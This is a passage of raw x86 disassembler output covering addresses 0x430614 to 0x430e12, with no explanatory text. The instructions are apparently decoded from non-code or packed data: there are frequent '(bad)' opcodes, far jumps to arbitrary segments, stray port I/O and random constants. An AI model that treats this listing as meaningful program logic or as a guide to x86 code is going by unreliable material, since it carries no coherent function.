  430614:	sti    
  430615:	add    BYTE PTR [eax+eiz*2],ah
  430618:	cmp    eax,0x8c2a8f24
  43061d:	inc    esp
  43061e:	pop    edi
  43061f:	sub    DWORD PTR [ecx-0x1],ecx
  430622:	lods   al,BYTE PTR ds:[esi]
  430623:	fwait
  430624:	cmp    eax,0xf95aab24
  430629:	dec    DWORD PTR [ebx-0x72bbeaed]
  43062f:	sbb    bh,cl
  430631:	test   BYTE PTR [ebx],bh
  430633:	mov    BYTE PTR [edx-0x73],dh
  430636:	mov    bh,0x36
  430638:	dec    ecx
  430639:	call   0x3c4698
  43063e:	call   FWORD PTR [esp+esi*2+0x991fb6e]
  430645:	gs mov edi,0x47633e
  43064b:	(bad)  
  43064c:	es sbb eax,0xa5059220
  430652:	mov    esi,0x4f831316
  430657:	xor    eax,DWORD PTR [esi+esi*8+0x19394f8d]
  43065e:	call   0x393de0
  430663:	mov    esi,0xcb95069a
  430668:	dec    ebp
  430669:	add    BYTE PTR [ebp+0x3e],dh
  43066c:	pusha  
  43066d:	lea    esp,[ebx+ecx*8]
  430670:	fld    DWORD PTR [eax]
  430672:	add    BYTE PTR [esi-0x2cafe2e2],ah
  430678:	repnz and eax,0x3b840b00
  43067e:	lea    ecx,[edi+0x39]
  430681:	sbb    DWORD PTR [ecx-0x1d],ebx
  430684:	mov    esi,DWORD PTR [edi+0x7d6144fd]
  43068a:	and    al,0x9b
  43068c:	fiadd  DWORD PTR [eax]
  43068e:	add    BYTE PTR [edx-0x70],ah
  430691:	ss jb  0x4306ea
  430694:	mov    ch,0xb9
  430696:	and    esp,DWORD PTR [esi]
  430698:	lahf   
  430699:	scas   al,BYTE PTR es:[edi]
  43069a:	pop    es
  43069b:	adc    al,ch
  43069d:	mov    ecx,0x6707e23
  4306a2:	mov    dl,0x1d
  4306a4:	xor    BYTE PTR [ebx-0x32bff401],ch
  4306aa:	out    0xf9,eax
  4306ac:	push   0xfffffffd
  4306ae:	inc    DWORD PTR [eax]
  4306b0:	loope  0x4306b5
  4306b2:	fiadd  WORD PTR [esi-0x2ea286b]
  4306b8:	jge    0x430698
  4306ba:	sub    al,BYTE PTR [eax]
  4306bc:	sbb    al,0xcb
  4306be:	mov    ecx,0x328b5223
  4306c3:	or     ah,al
  4306c5:	fs cmp dl,bh
  4306c8:	pop    ebp
  4306c9:	sub    BYTE PTR ds:0x2b342a7f,al
  4306cf:	add    ebx,ecx
  4306d1:	push   es
  4306d2:	loope  0x4306e3
  4306d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4306d5:	add    al,0xdc
  4306d7:	xchg   BYTE PTR [edi-0x2],al
  4306da:	inc    edx
  4306db:	or     esp,DWORD PTR [edx-0x41]
  4306de:	sub    BYTE PTR [edi],cl
  4306e0:	xchg   esp,eax
  4306e1:	repz mov edi,eax
  4306e4:	jno    0x430672
  4306e6:	test   DWORD PTR [ebx+0x46],esi
  4306e9:	push   edx
  4306ea:	div    BYTE PTR [edx+0x5e]
  4306ed:	inc    ebx
  4306ee:	xchg   DWORD PTR [ecx+0x4efd4262],ebp
  4306f4:	push   ecx
  4306f5:	xchg   ecx,ecx
  4306f7:	xchg   BYTE PTR [eax+eax*1],cl
  4306fa:	xchg   BYTE PTR [ebx+0x3e],ch
  4306fd:	xchg   BYTE PTR cs:[ebx+0x46],bl
  430701:	cs inc eax
  430703:	inc    ebx
  430704:	ds xor dh,ch
  430707:	(bad)  
  430708:	fstp   st(1)
  43070a:	out    0x8c,eax
  43070c:	push   0x9b2c2cd8
  430711:	(bad)  
  430713:	add    eax,DWORD PTR [eax]
  430715:	ficomp WORD PTR [ecx]
  430717:	aam    0x11
  430719:	adc    BYTE PTR [eax+0x32],ah
  43071c:	sub    al,0xfe
  43071e:	fsubrp st(7),st
  430720:	add    esp,ebp
  430722:	popf   
  430723:	or     edx,DWORD PTR [eax+ebx*1]
  430726:	mov    al,ds:0x58552c66
  43072b:	adc    al,0xfc
  43072d:	jl     0x4306d9
  43072f:	outs   dx,BYTE PTR ds:[esi]
  430730:	sub    eax,0xb6ebb454
  430735:	inc    edi
  430736:	pusha  
  430737:	stos   DWORD PTR es:[edi],eax
  430738:	fild   QWORD PTR [ebp+0x60]
  43073b:	jnp    0x43071c
  43073d:	push   ecx
  43073e:	pusha  
  43073f:	jmp    0xff42:0xe6e12386
  430746:	in     al,dx
  430747:	xchg   edi,eax
  430748:	xchg   BYTE PTR [edx-0x5abb191f],ah
  43074e:	push   esp
  43074f:	hlt    
  430750:	mov    ds:0x84e79973,eax
  430755:	and    ebp,esp
  430757:	fs inc ebx
  430759:	mov    dh,0xe5
  43075b:	sbb    al,0x8d
  43075d:	sub    BYTE PTR [ecx+0x46],al
  430760:	jmp    FWORD PTR ds:0x3c852454
  430766:	adc    DWORD PTR ds:0xdf10dc85,esp
  43076c:	test   al,0x61
  43076e:	aad    0xa9
  430770:	mov    WORD PTR [ecx-0x56731003],ss
  430776:	std    
  430777:	jmp    0x430705
  430779:	add    BYTE PTR [ecx-0x76732803],ah
  43077f:	std    
  430780:	rol    ecx,cl
  430782:	sub    al,0x58
  430784:	add    BYTE PTR [ecx-0x4e3c2d17],ch
  43078a:	call   0xe9442c56
  43078f:	scas   eax,DWORD PTR es:[edi]
  430790:	and    al,0xfd
  430792:	fcom   DWORD PTR [edi-0x402706dc]
  430798:	and    al,0xf5
  43079a:	mov    esi,0xddf604c6
  43079f:	mov    edx,0xb56a3ef9
  4307a4:	push   ebp
  4307a5:	xchg   esi,eax
  4307a6:	mov    edx,edx
  4307a8:	(bad)  
  4307a9:	fldenv [esi]
  4307ab:	stos   BYTE PTR es:[edi],al
  4307ac:	test   DWORD PTR [ebp+0x7251dbb5],ebx
  4307b2:	dec    eax
  4307b3:	pop    ebx
  4307b4:	retf   0x7601
  4307b7:	fld    DWORD PTR [eax]
  4307b9:	jmp    0xc9b79bbb
  4307be:	fcomp  QWORD PTR [ecx+0x1ede9908]
  4307c4:	call   0xf9966bdd
  4307c9:	mov    eax,fs:0xe93f0fd1
  4307cf:	pop    ds
  4307d0:	call   0x11c6f1f
  4307d5:	ins    DWORD PTR es:[edi],dx
  4307d6:	sahf   
  4307d7:	int    0x3
  4307d9:	sbb    ah,BYTE PTR [esi+0xebe612]
  4307df:	xor    BYTE PTR [ebx-0x295fe0a7],dl
  4307e5:	add    BYTE PTR [ecx+ebx*8],bl
  4307e8:	ds dec edi
  4307ea:	sbb    ch,BYTE PTR [eax+ebp*4]
  4307ed:	mov    esi,DWORD PTR [edx+ebx*2]
  4307f0:	cmp    ah,BYTE PTR [ebx]
  4307f2:	jl     0x43085a
  4307f4:	fld    DWORD PTR [ebp+0x744fe391]
  4307fa:	pop    ds
  4307fb:	jmp    0x884404b5
  430800:	push   cs
  430801:	add    DWORD PTR [ebp+eax*2+0x7f],edi
  430805:	add    DWORD PTR [edx-0x5],ebp
  430808:	or     esi,DWORD PTR ds:0xf992cc48
  43080e:	(bad)  
  43080f:	(bad)  
  430810:	or     cl,BYTE PTR [edx]
  430812:	inc    eax
  430813:	mov    ebx,0x2585e95f
  430818:	mov    DWORD PTR [eax],ecx
  43081a:	and    DWORD PTR [ebp-0x23],0x79
  43081e:	data16 (bad) 
  430820:	(bad)  
  430821:	loope  0x430825
  430823:	test   al,0x4
  430825:	test   esi,esi
  430827:	out    0x3d,eax
  430829:	or     dh,0x2
  43082c:	dec    ebx
  43082d:	mov    BYTE PTR [esi-0x79],bl
  430830:	(bad)  
  430831:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430832:	(bad)  
  430833:	ins    BYTE PTR es:[edi],dx
  430834:	or     bh,BYTE PTR [ebx+0x7e]
  430837:	ja     0x430816
  430839:	jnp    0x430846
  43083b:	add    bl,bl
  43083d:	call   0x119899a
  430842:	mov    eax,DWORD PTR [eax]
  430844:	cmp    eax,0x358afffe
  430849:	dec    BYTE PTR [eax]
  43084b:	mov    edi,DWORD PTR [ebp+eax*1+0x49]
  43084f:	sbb    cl,BYTE PTR [ebx-0x2a]
  430852:	sub    eax,eax
  430854:	mov    WORD PTR [ebx],gs
  430856:	push   edx
  430857:	leave  
  430858:	clc    
  430859:	es dec edi
  43085b:	push   edi
  43085c:	ror    BYTE PTR ds:0xd64a26e2,0x0
  430863:	mov    edi,DWORD PTR ds:0xb604775f
  430869:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43086a:	ins    DWORD PTR es:[edi],dx
  43086b:	xor    BYTE PTR [esi+0x702c6e0b],al
  430871:	or     dh,BYTE PTR [edx]
  430873:	mov    edx,esp
  430875:	std    
  430876:	push   0x1a
  430878:	bound  eax,QWORD PTR [eax-0x3]
  43087b:	xchg   dl,dh
  43087d:	mov    esp,0x8e5e742b
  430882:	push   esi
  430883:	out    0x3a,al
  430885:	jmp    0x43080c
  430887:	shr    DWORD PTR [ebx+0x62fffdb1],1
  43088d:	pop    eax
  43088e:	stos   DWORD PTR es:[edi],eax
  43088f:	lea    esp,[edx+0x40]
  430892:	xchg   cl,cl
  430894:	fcom   DWORD PTR [edi+0x40680025]
  43089a:	std    
  43089b:	out    0x52,al
  43089d:	push   ss
  43089e:	std    
  43089f:	cs nop
  4308a1:	pop    eax
  4308a2:	mov    edi,edi
  4308a4:	lods   eax,DWORD PTR ds:[esi]
  4308a5:	aas    
  4308a6:	and    eax,0x3fd0005c
  4308ab:	std    
  4308ac:	test   DWORD PTR [edx-0x5e7a2c9e],edi
  4308b2:	push   ss
  4308b3:	xchg   BYTE PTR ds:[esi],ah
  4308b6:	sbb    al,0xf9
  4308b8:	dec    esi
  4308b9:	das    
  4308ba:	xchg   edx,eax
  4308bb:	xchg   BYTE PTR [eax+0x66],dh
  4308be:	mov    eax,DWORD PTR [esi+0x32dab737]
  4308c4:	out    dx,eax
  4308c5:	bound  ecx,QWORD PTR [edi-0x4998e1aa]
  4308cb:	dec    esi
  4308cc:	test   BYTE PTR [ecx+eax*8+0x17],dl
  4308d0:	xchg   DWORD PTR [ebx-0x3d],ebp
  4308d3:	cmp    eax,0xd5f9c41b
  4308d8:	add    ecx,esp
  4308da:	cmp    DWORD PTR [eax-0x88a7f00],ecx
  4308e0:	ret    0x41af
  4308e3:	mov    edi,0xc2db237e
  4308e8:	je     0x430923
  4308ea:	call   0x852c65c1
  4308ef:	xlat   BYTE PTR ds:[ebx]
  4308f0:	mov    ebp,0xd0e7d96a
  4308f5:	in     al,0x32
  4308f7:	(bad)  
  4308f8:	dec    edx
  4308f9:	scas   al,BYTE PTR es:[edi]
  4308fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4308fb:	pop    esi
  4308fc:	xor    esp,esp
  4308fe:	inc    edx
  4308ff:	ror    al,1
  430901:	popa   
  430902:	iret   
  430903:	mov    ch,0xcc
  430905:	in     al,0x52
  430907:	outs   dx,BYTE PTR ds:[esi]
  430908:	add    DWORD PTR [eax+0xfd2412],eax
  43090e:	xchg   ecx,eax
  43090f:	(bad)  
  430910:	retf   
  430911:	adc    BYTE PTR ds:0xcd13cdf6,0x17
  430918:	mov    bh,0x34
  43091a:	push   ecx
  43091b:	cmc    
  43091c:	repz xor al,0x56
  43091f:	mov    ecx,0x5bb5c3f1
  430924:	sub    ecx,DWORD PTR [eax]
  430926:	out    0x19,eax
  430928:	mov    ah,0x2
  43092a:	and    BYTE PTR [ecx+eiz*1],cl
  43092d:	mov    edi,0xf8ef181c
  430932:	cld    
  430933:	aam    0xa3
  430935:	push   ecx
  430936:	sub    BYTE PTR [ecx+eiz*1-0x2a],ah
  43093a:	es mov ah,0x25
  43093d:	or     al,0x62
  43093f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430940:	mov    dl,0x88
  430942:	stc    
  430943:	hlt    
  430944:	repz rcr dh,cl
  430947:	cwde   
  430948:	fcmovnbe st,st(3)
  43094a:	fmul   QWORD PTR [edx-0x1]
  43094d:	sahf   
  43094e:	pop    eax
  43094f:	push   eax
  430950:	jmp    0xded2:0xfbd0157e
  430957:	xchg   edi,eax
  430958:	add    edx,esp
  43095a:	fcomp  QWORD PTR [esi]
  43095c:	mov    edi,0xca50388f
  430961:	jle    0x430958
  430963:	iret   
  430964:	jmp    0x430956
  430966:	in     eax,dx
  430967:	inc    ebx
  430968:	out    0xf0,al
  43096a:	in     eax,0x98
  43096c:	add    BYTE PTR [esi],dl
  43096e:	xor    al,0x8e
  430970:	add    al,0xe9
  430972:	add    dl,ch
  430974:	fwait
  430975:	and    al,0xf1
  430977:	ficom  DWORD PTR [edi-0x43a8dfc]
  43097d:	or     al,0x62
  43097f:	and    esp,ebx
  430981:	xor    eax,0x2e4ec4a1
  430986:	test   eax,0x6ac0e7a2
  43098b:	inc    ecx
  43098c:	push   edx
  43098d:	inc    eax
  43098e:	stos   BYTE PTR es:[edi],al
  43098f:	or     edx,DWORD PTR [eax+0x61]
  430992:	xor    al,0x7e
  430994:	push   cs
  430995:	add    ebx,edx
  430997:	leave  
  430998:	push   edx
  430999:	outs   dx,DWORD PTR ds:[esi]
  43099a:	in     eax,0x8e
  43099c:	or     ecx,ebp
  43099e:	adc    eax,0x6a00da55
  4309a3:	jne    0x430991
  4309a5:	mov    ebp,0xcfb9d72
  4309aa:	jb     0x430949
  4309ac:	sti    
  4309ad:	or     BYTE PTR [edi-0x1edb3416],bl
  4309b3:	fcomp  QWORD PTR [ebp+0x5c7f2608]
  4309b9:	inc    edi
  4309ba:	icebp  
  4309bb:	cmp    DWORD PTR [esp+eax*1+0x7a5961e9],esi
  4309c2:	in     eax,0x61
  4309c4:	mov    bl,0x73
  4309c6:	jmp    0x430a06
  4309c8:	sub    BYTE PTR [ebp+0x4de43d6a],bh
  4309ce:	bound  esi,QWORD PTR ds:0xea9714fb
  4309d4:	dec    ecx
  4309d5:	test   DWORD PTR [edi],edi
  4309d7:	add    BYTE PTR [edx+0x4e],bl
  4309da:	dec    esi
  4309db:	in     eax,0xe4
  4309dd:	sbb    al,0x38
  4309df:	shl    DWORD PTR [ebp-0xf],0x0
  4309e3:	jmp    0x4c98c5
  4309e8:	mov    edi,0x3bfff9d2
  4309ed:	sar    BYTE PTR [edi],1
  4309ef:	add    al,0x88
  4309f1:	sbb    DWORD PTR ds:0x72580b08,0x3dcdfb04
  4309fb:	and    al,0xb
  4309fd:	fadd   QWORD PTR [esi+0xdb0b92]
  430a03:	xor    eax,edx
  430a05:	xor    BYTE PTR [eax+0x4deb1f4c],cl
  430a0b:	mov    esp,DWORD PTR [eax]
  430a0d:	fdiv   st,st(7)
  430a0f:	xor    esp,esi
  430a11:	pusha  
  430a12:	mov    ecx,0xc8480d7e
  430a17:	lea    ecx,[ebx+edx*2]
  430a1a:	mov    BYTE PTR [edi+ebx*2+0x35],cl
  430a1e:	add    BYTE PTR [esi],0x48
  430a21:	xchg   ebp,eax
  430a22:	add    DWORD PTR [edx-0x51],ebp
  430a25:	xlat   BYTE PTR ds:[ebx]
  430a26:	mov    edi,0x150bc950
  430a2b:	pusha  
  430a2c:	lea    ebx,[edx]
  430a2e:	stc    
  430a2f:	or     BYTE PTR [edi-0x27],0x83
  430a33:	ror    bh,0x90
  430a36:	or     BYTE PTR [edi+ebx*4+0x3a],0x44
  430a3b:	add    DWORD PTR [eax],0x3a
  430a3e:	cmp    eax,0x3aaf4c88
  430a43:	mov    WORD PTR [edi-0x7d],ss
  430a46:	aas    
  430a47:	gs and al,0x83
  430a4a:	jle    0x430a16
  430a4c:	push   edi
  430a4d:	lock call 0x84f7:0xb55f0e1
  430a55:	mov    edx,DWORD PTR [eax-0x1e8274ee]
  430a5b:	or     eax,0x3320cb0
  430a61:	bound  esi,QWORD PTR [esi]
  430a63:	fwait
  430a64:	aaa    
  430a65:	mov    ds:0xa488d407,al
  430a6a:	cmp    al,0x2e
  430a6c:	adc    al,0x86
  430a6e:	es mov ebp,0xf97be0ff
  430a74:	xchg   BYTE PTR [esi-0x6178eb2c],bl
  430a7a:	sbb    al,0x11
  430a7c:	inc    eax
  430a7d:	loope  0x4309ff
  430a7f:	in     eax,0x36
  430a81:	mov    eax,ds:0x3e437c3c
  430a86:	push   eax
  430a87:	jp     0x430acc
  430a89:	inc    esi
  430a8a:	cmp    BYTE PTR [ebx+ecx*2+0x3e],bh
  430a8e:	and    al,0xfe
  430a90:	mov    ebx,DWORD PTR [edx-0x39]
  430a93:	cs cli 
  430a95:	xor    eax,0x665179dd
  430a9a:	sub    edx,DWORD PTR [ebx+0x37]
  430a9d:	fscale 
  430a9f:	adc    eax,0x40550041
  430aa4:	std    
  430aa5:	scas   eax,DWORD PTR es:[edi]
  430aa6:	arpl   WORD PTR [esi-0x36],di
  430aa9:	jle    0x430a51
  430aab:	inc    ebx
  430aac:	inc    ebx
  430aad:	pop    es
  430aae:	bound  esi,QWORD PTR [ebp+0x19f97720]
  430ab4:	std    
  430ab5:	push   edx
  430ab6:	das    
  430ab7:	mov    ebx,0x4154e73f
  430abc:	std    
  430abd:	(bad)  
  430abe:	jns    0x430a64
  430ac0:	jge    0x430b3d
  430ac2:	inc    esi
  430ac3:	cmp    ch,bh
  430ac5:	push   ecx
  430ac6:	or     eax,0x5e23a9bb
  430acb:	retf   
  430acc:	xor    al,0x73
  430ace:	pop    edx
  430acf:	call   0x44a02041
  430ad4:	jne    0x430b18
  430ad6:	pop    esi
  430ad7:	arpl   WORD PTR [edx-0x37],di
  430ada:	cmp    bl,dl
  430adc:	mov    ebp,0x634d4830
  430ae1:	inc    esp
  430ae2:	mov    dh,0xd5
  430ae4:	adc    eax,0x5efd3c44
  430ae9:	fisub  DWORD PTR [ecx-0x69]
  430aec:	dec    esi
  430aed:	push   esi
  430aee:	ins    DWORD PTR es:[edi],dx
  430aef:	pusha  
  430af0:	test   eax,0xe7e4131c
  430af5:	add    ebx,esi
  430af7:	sbb    DWORD PTR [ebx],esi
  430af9:	push   ds
  430afa:	in     al,0x93
  430afc:	jmp    0x430b7a
  430afe:	sbb    eax,0xfcecb0c1
  430b03:	fdivp  st(5),st
  430b05:	jmp    0x430b07
  430b07:	xor    eax,0xa37b38a4
  430b0c:	aad    0x82
  430b0e:	pop    ss
  430b0f:	xchg   bl,ah
  430b11:	daa    
  430b12:	add    al,0x5d
  430b14:	adc    eax,0xac6273e3
  430b19:	or     DWORD PTR [esi+0x65],eax
  430b1c:	fldenv [esi+0x20]
  430b1f:	lea    ebp,[eax-0x40ef264c]
  430b25:	pmaddwd mm0,mm6
  430b28:	pop    esi
  430b29:	mov    ds:0x97a651e7,eax
  430b2e:	jl     0x430aba
  430b30:	dec    esp
  430b31:	aam    0xa7
  430b33:	jae    0x430ace
  430b35:	out    0x7c,eax
  430b37:	adc    ebp,esi
  430b39:	(bad)  
  430b3a:	jl     0x430b8a
  430b3c:	lods   eax,DWORD PTR ds:[esi]
  430b3d:	stc    
  430b3e:	ret    
  430b3f:	test   edx,eax
  430b41:	repz jle 0x430b67
  430b44:	fidiv  DWORD PTR [edi-0x440ade82]
  430b4a:	shr    DWORD PTR [eax+0x24],cl
  430b4d:	bnd jns 0x430b71
  430b50:	cmc    
  430b51:	call   0x6bff:0xf12184
  430b58:	fisub  DWORD PTR [esi-0x18]
  430b5b:	sbb    bh,bl
  430b5d:	inc    ebx
  430b5e:	test   al,0xc9
  430b60:	cwde   
  430b61:	and    al,0x26
  430b63:	or     BYTE PTR [ecx],dl
  430b65:	imul   esi,eax,0xffffffed
  430b68:	lock in ax,0x0
  430b6c:	lods   al,BYTE PTR ds:[esi]
  430b6d:	call   0xf524:0x98a51913
  430b74:	xor    DWORD PTR [edi-0x2f],ecx
  430b77:	dec    edi
  430b78:	xchg   edi,eax
  430b79:	call   0x7062:0xe0a56a17
  430b80:	sbb    eax,0x6b9730f8
  430b85:	dec    ebx
  430b86:	ins    DWORD PTR es:[edi],dx
  430b87:	test   bl,0x10
  430b8a:	imul   eax,edx,0xffffffb5
  430b8d:	lock fldenvw [edx+ebx*4+0x15]
  430b93:	sbb    DWORD PTR [ebp-0x68],ebx
  430b96:	and    al,0xb5
  430b98:	mov    cl,0x4e
  430b9a:	rol    DWORD PTR [edi],1
  430b9c:	dec    edi
  430b9d:	call   0x7062:0xe01d6a25
  430ba4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430ba5:	test   DWORD PTR [ebx+eax*8+0x60],0x4a05445e
  430bad:	test   eax,0xdf493285
  430bb2:	stc    
  430bb3:	ds push edx
  430bb5:	scas   eax,DWORD PTR es:[edi]
  430bb6:	pop    edx
  430bb7:	xchg   esp,eax
  430bb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430bb9:	retf   0xf1c4
  430bbc:	daa    
  430bbd:	fadd   DWORD PTR [eax]
  430bbf:	mov    edi,0x11f752aa
  430bc4:	and    ecx,esi
  430bc6:	stc    
  430bc7:	push   ss
  430bc8:	test   bh,0x24
  430bcb:	stc    
  430bcc:	mov    edx,DWORD PTR [edx-0x37]
  430bcf:	add    BYTE PTR [eax],al
  430bd1:	repnz and ebp,edi
  430bd4:	out    0x65,eax
  430bd6:	std    
  430bd7:	idiv   bh
  430bd9:	(bad)  
  430bda:	xchg   esi,eax
  430bdb:	ins    DWORD PTR es:[edi],dx
  430bdc:	sbb    al,al
  430bde:	adc    bl,BYTE PTR ds:0x3195b00c
  430be4:	add    eax,DWORD PTR [ecx+esi*2+0x31]
  430be8:	push   esi
  430be9:	jnp    0x430be5
  430beb:	adc    al,0x5c
  430bed:	xor    eax,0xf782f917
  430bf2:	fnstenv [eax-0x44e483ff]
  430bf8:	or     al,0xb
  430bfa:	es dec edx
  430bfc:	push   ebp
  430bfd:	jne    0x430bcd
  430bff:	ins    DWORD PTR es:[edi],dx
  430c00:	and    al,0x7
  430c02:	jo     0x430bf3
  430c04:	cmp    BYTE PTR [eax-0x6c],dh
  430c07:	dec    esi
  430c08:	add    ebx,DWORD PTR [ebx]
  430c0a:	shl    BYTE PTR [ebp+0x24],1
  430c0d:	dec    ebp
  430c0f:	cmp    eax,0xd2480b24
  430c14:	mov    bl,bh
  430c16:	xor    bl,BYTE PTR [ecx]
  430c18:	xor    ecx,DWORD PTR [ebx]
  430c1a:	je     0x430c54
  430c1c:	inc    edi
  430c1d:	fwait
  430c1e:	or     BYTE PTR [esi+0x6a],0xb7
  430c22:	pop    ecx
  430c23:	data16 sbb al,0x4e
  430c26:	adc    edx,DWORD PTR ds:0x14fbfb55
  430c2c:	pusha  
  430c2d:	mov    ch,0x16
  430c2f:	stc    
  430c30:	xor    BYTE PTR [edi-0x27],0x83
  430c34:	rol    BYTE PTR [eax],0xd7
  430c37:	xor    BYTE PTR [eax-0x75],dl
  430c3a:	mov    edi,0x23550d32
  430c3f:	push   esp
  430c40:	cmc    
  430c41:	(bad)  
  430c42:	cmp    al,0x60
  430c44:	mov    ecx,0x7d94fc0f
  430c49:	shl    BYTE PTR [edx+0x6d],0xd7
  430c4d:	sub    DWORD PTR [ebp+0x65],0xd
  430c51:	pop    si
  430c53:	(bad)
  430c56:	mov    bh,0x70
  430c58:	sub    dl,BYTE PTR [esi+esi*4]
  430c5b:	sub    bh,BYTE PTR [ebp+0xf3e0ff]
  430c61:	scas   eax,DWORD PTR es:[edi]
  430c62:	arpl   WORD PTR [ebx+0x72],ax
  430c65:	inc    edx
  430c66:	adc    BYTE PTR [edx-0x537dbe15],0xf6
  430c6d:	sub    DWORD PTR ds:0xdb6208a5,0xfffffff9
  430c74:	in     al,0xae
  430c76:	arpl   WORD PTR [edi+0x3d],cx
  430c79:	popa   
  430c7a:	pop    ebx
  430c7b:	sti    
  430c7c:	clc    
  430c7d:	jae    0x430c36
  430c7f:	xchg   esi,eax
  430c80:	adc    al,0x8d
  430c82:	jne    0x430ca0
  430c84:	add    BYTE PTR [ecx+0x46],0x5
  430c88:	aad    0xfa
  430c8a:	dec    edi
  430c8b:	loopne 0x430c9f
  430c8d:	inc    eax
  430c8e:	bound  edi,QWORD PTR [edi+0x7fdf0b41]
  430c94:	mov    cl,0x25
  430c96:	xor    eax,edi
  430c98:	mov    ecx,0xed6e0023
  430c9d:	sbb    al,0x5e
  430c9f:	into   
  430ca0:	mov    edx,0x42a2842a
  430ca5:	mov    bh,BYTE PTR [edi+0x25b8ffe6]
  430cab:	fisub  WORD PTR [edx+0x50380fb8]
  430cb1:	add    BYTE PTR [ecx+0x7e],0x6d
  430cb5:	int    0xfa
  430cb7:	ja     0x430d25
  430cb9:	adc    eax,DWORD PTR [eax+0x62]
  430cbc:	mov    edi,0x40d10b41
  430cc1:	cli    
  430cc2:	mov    dl,0x1d
  430cc4:	(bad)  
  430cc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430cc7:	cmp    dl,BYTE PTR [ebx+0x555fb7d3]
  430ccd:	adc    bh,BYTE PTR [eax-0x3a9f4c9f]
  430cd3:	xor    DWORD PTR [esi-0x59443118],eax
  430cd9:	ins    DWORD PTR es:[edi],dx
  430cda:	inc    edx
  430cdb:	lods   al,BYTE PTR ds:[esi]
  430cdc:	mov    ds:0xaf4dff25,al
  430ce1:	pop    esi
  430ce2:	xor    al,0xdc
  430ce4:	xchg   ebp,eax
  430ce5:	or     edi,esp
  430ce7:	in     al,0x9f
  430ce9:	jecxz  0x430c83
  430ceb:	sub    al,BYTE PTR [edx]
  430ced:	out    0xfd,eax
  430cef:	les    ebx,FWORD PTR [ecx]
  430cf1:	smsw   WORD PTR [eax+0x4]
  430cf5:	repnz mov cl,0x64
  430cf8:	test   eax,0x314dd36c
  430cfd:	stos   BYTE PTR es:[edi],al
  430cfe:	push   ss
  430cff:	add    BYTE PTR [edx-0x27],ah
  430d02:	mov    esi,0x6b193402
  430d07:	inc    esp
  430d08:	jno    0x430cf3
  430d0a:	call   0x8508:0x395461be
  430d11:	sub    ecx,edi
  430d13:	js     0x430d30
  430d15:	xor    ah,BYTE PTR [ebx+0x19d96218]
  430d1b:	inc    edx
  430d1c:	popa   
  430d1d:	fldenv [esi+0x20]
  430d20:	jge    0x430cce
  430d22:	adc    al,0xd6
  430d24:	fmul   st(5),st
  430d26:	or     eax,esp
  430d28:	adc    BYTE PTR [ebx+ebx*8-0x19],dl
  430d2c:	sbb    eax,0x197f4054
  430d31:	std    
  430d32:	sti    
  430d33:	cdq    
  430d34:	push   ecx
  430d35:	hlt    
  430d36:	cmp    bh,BYTE PTR [ebx+0x9]
  430d39:	std    
  430d3a:	sar    DWORD PTR [eax-0x50],cl
  430d3d:	hlt    
  430d3e:	add    BYTE PTR [esi],ah
  430d40:	fwait
  430d41:	pop    esi
  430d42:	add    al,0xd7
  430d44:	xchg   ebx,eax
  430d45:	inc    esi
  430d46:	sub    ebp,0x94460750
  430d4c:	sub    eax,0xb4d0f2f7
  430d51:	fdivr  QWORD PTR [edx-0x4e]
  430d54:	in     al,0xab
  430d56:	and    al,0xe1
  430d58:	cmp    ch,BYTE PTR [ebx]
  430d5a:	xchg   DWORD PTR [ebp+0x1785ec3d],edx
  430d60:	retf   
  430d61:	popf   
  430d62:	add    BYTE PTR [edx+0x0],ch
  430d65:	sahf   
  430d66:	loopne 0x430d65
  430d68:	test   eax,0xf5661b1a
  430d6d:	mov    edx,0x3a2d8713
  430d72:	mov    al,ds:0x5e79625b
  430d77:	add    al,0xf6
  430d79:	adc    ebx,ecx
  430d7b:	mov    ch,ah
  430d7d:	sbb    ebx,DWORD PTR [ecx+0x5f4a3c4b]
  430d83:	jl     0x430d8a
  430d85:	(bad)  
  430d86:	pop    esi
  430d87:	ins    BYTE PTR es:[edi],dx
  430d88:	int    0x51
  430d8a:	mov    edi,0xfc1d6c14
  430d8f:	sbb    al,0x39
  430d91:	ins    DWORD PTR es:[edi],dx
  430d92:	pushf  
  430d93:	and    al,0xd5
  430d95:	adc    DWORD PTR [ebx+0x13],eax
  430d98:	or     DWORD PTR [ecx+ebx*4+0x0],esi
  430d9c:	push   0x1d
  430d9e:	aam    0x83
  430da0:	test   eax,0x1585edf9
  430da5:	mov    edx,0x226a42eb
  430daa:	adc    BYTE PTR [esi],dh
  430dac:	aam    0x5d
  430dae:	lds    ebp,FWORD PTR [edi+0x5943696a]
  430db4:	scas   eax,DWORD PTR es:[edi]
  430db5:	xchg   esp,eax
  430db6:	scas   al,BYTE PTR es:[edi]
  430db7:	jge    0x430db9
  430db9:	dec    edi
  430dba:	dec    esp
  430dbb:	mov    ebx,0xbfc08b08
  430dc0:	jmp    0x430e0b
  430dc2:	sub    DWORD PTR [edi+0x57],ecx
  430dc5:	add    bl,dh
  430dc7:	sub    dh,dh
  430dc9:	add    BYTE PTR [edx-0x62820274],al
  430dcf:	rcl    bh,0x8b
  430dd2:	jl     0x430e2c
  430dd4:	mov    ecx,0xf9efe108
  430dd9:	ret    0xf5fb
  430ddc:	ins    DWORD PTR es:[edi],dx
  430ddd:	and    al,0x43
  430ddf:	not    BYTE PTR [eax+eiz*2]
  430de2:	sub    eax,0x7f82f91b
  430de7:	inc    esi
  430de8:	test   al,al
  430dea:	lahf   
  430deb:	out    dx,eax
  430dec:	or     DWORD PTR ds:[eax],0x36
  430df0:	xor    dh,BYTE PTR [edi+0x3f]
  430df3:	jg     0x430dca
  430df5:	add    DWORD PTR [ebx],0xfffffff3
  430df8:	push   esi
  430df9:	pop    esi
  430dfa:	inc    eax
  430dfb:	lahf   
  430dfc:	std    
  430dfd:	call   DWORD PTR [eax+0x8f6e29b]
  430e03:	lods   eax,DWORD PTR ds:[esi]
  430e04:	cmp    BYTE PTR [ecx-0x1],dl
  430e07:	jbe    0x430e26
  430e09:	data16 add ch,BYTE PTR [esi]
  430e0c:	sbb    DWORD PTR [ebp-0x3],esi
  430e0f:	js     0x430e49
  430e11:	push   ecx
  430e12:	emms   
